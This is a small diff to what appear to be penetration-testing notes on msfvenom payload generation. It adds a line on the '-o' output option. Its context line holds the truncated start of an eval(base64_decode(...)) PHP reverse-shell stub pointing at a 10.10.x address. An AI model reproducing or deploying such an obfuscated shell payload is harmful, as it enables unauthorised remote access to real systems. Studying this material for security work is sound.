@@ -28,6 +28,7 @@ eval(base64_decode('Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEw
 `-p` denotes the payload we want to encode
 `-f` is the output format we want
 `-e` is the encoded format of the payload
+`-o` output file name
 
 ### Handler
 
